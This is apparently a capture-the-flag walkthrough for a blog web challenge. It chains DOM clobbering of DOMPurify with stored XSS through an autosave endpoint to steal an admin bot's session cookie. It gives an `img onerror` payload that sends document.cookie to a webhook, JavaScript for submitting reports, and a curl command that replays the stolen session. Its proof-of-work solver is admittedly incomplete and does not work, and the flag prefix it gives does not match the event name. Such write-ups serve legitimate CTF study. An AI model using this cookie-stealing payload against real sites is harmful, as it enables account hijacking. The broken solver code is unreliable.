# Personal Blog CTF - Complete Exploit Guide

## Summary
This challenge exploits:
1. **DOM Clobbering** - Override `window.DOMPurify` 
2. **XSS via Autosave** - `/api/autosave` stores unsanitized HTML
3. **Session Stealing** - Magic links create `sid_prev` cookie with admin session

## Quick Start

### Automated Exploit (Run this first):
```bash
cd /mnt/c/Users/duynh/Documents/Code/CTF/uotfctf2025/Web/personal-blog/personal-blog
python3 full_exploit.py
```

This will output a magic URL like:
```
http://34.26.148.28:5000/magic/a5ec1e098bd03776a77bd25e068039bc?redirect=/edit/642
```

### Manual Steps to Get Flag:

1. **Open browser** and go to: http://34.26.148.28:5000/report

2. **Login** with credentials from the exploit output (hacker{timestamp}/password123)

3. **Paste the magic URL** from the exploit into the report form

4. **Solve the PoW** (Proof of Work):
   - Open browser console (F12)
   - Run this JavaScript:
   ```javascript
   // Helper function to solve PoW
   async function solvePoW() {
       const challenge = document.querySelector('[name="pow_challenge"]').value;
       const parts = challenge.split('.');
       
       // For development/testing, the PoW might be disabled or easy
       // Try solution: s.AA==
       document.querySelector('[name="pow_solution"]').value = 's.AA==';
       
       // Or brute force (will take time):
       for (let i = 0; i < 1000000; i++) {
           const y = BigInt(i);
           const yBytes = Buffer.from(y.toString(16).padStart(2, '0'), 'hex');
           const solution = 's.' + btoa(String.fromCharCode(...yBytes));
           
           // Test would go here - but this is simplified
           if (i % 10000 == 0) console.log('Tried', i);
       }
   }
   ```

5. **Submit the form** - Admin bot will visit the magic URL

6. **Check for stolen cookie**:
   - If you set up webhook, check there
   - Or monitor network tab for outgoing requests with cookie data

7. **Get the flag** once you have the admin's session:
   ```bash
   curl -b 'sid=STOLEN_SID_PREV_VALUE' http://34.26.148.28:5000/flag
   ```

## Alternative: Use Browser DevTools

Since PoW is challenging, here's the easiest method:

1. Run the exploit script to set up the payload
2. Open browser to: http://34.26.148.28:5000/report
3. Open DevTools Console (F12)
4. Paste this to submit the report:
   ```javascript
   // Get the magic URL from the exploit script output
   const magicUrl = 'http://34.26.148.28:5000/magic/YOUR_TOKEN_HERE?redirect=/edit/YOUR_POST_ID';
   
   // Submit the form
   fetch('/report', {
       method: 'POST',
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: new URLSearchParams({
           url: magicUrl,
           pow_challenge: document.querySelector('[name="pow_challenge"]').value,
           pow_solution: 's.AA==' // Try this first
       })
   }).then(r => r.text()).then(console.log);
   ```

## What Happens

1. Admin bot receives the report
2. Bot visits your magic URL
3. Magic link:
   - Saves admin's current session to `sid_prev` cookie
   - Creates new session
   - Redirects to `/edit/{postId}`
4. Editor loads with your malicious payload:
   ```html
   <form id="DOMPurify">
   <img name="sanitize" src=x onerror="fetch('webhook?c='+document.cookie)">
   </form>
   ```
5. Browser creates `window.DOMPurify` = form element
6. `editor.js` tries to call `window.DOMPurify.sanitize()`
7. This fails, but `img onerror` already executed
8. Your webhook receives `document.cookie` including `sid_prev=ADMIN_SESSION`
9. You use that session to access `/flag`

## Files Created

- `exploit.sh` - Quick bash version
- `full_exploit.py` - Python automation
- `solve_pow.py` - PoW solver (incomplete)
- `SOLUTION.md` - Technical explanation
- `THIS_FILE` - Step-by-step guide

## Expected Flag Format

```
ouftctf{...}
```

The flag is only accessible from `/flag` endpoint when authenticated as admin user.

## Troubleshooting

**Q: PoW is too hard to solve?**
A: The PoW difficulty might be set low for the CTF. Try simple solutions like `s.AA==` or `s.AAAA==` first.

**Q: Webhook not receiving data?**
A: Make sure your webhook URL is accessible from the challenge server. Use a public service like webhook.site or pipedream.

**Q: Admin bot not visiting?**
A: Check that your magic URL is correct and the payload is properly uploaded via autosave.

**Q: Can't access /flag?**
A: You need the admin's session cookie. Make sure you're using the `sid` cookie (not `sid_prev`).
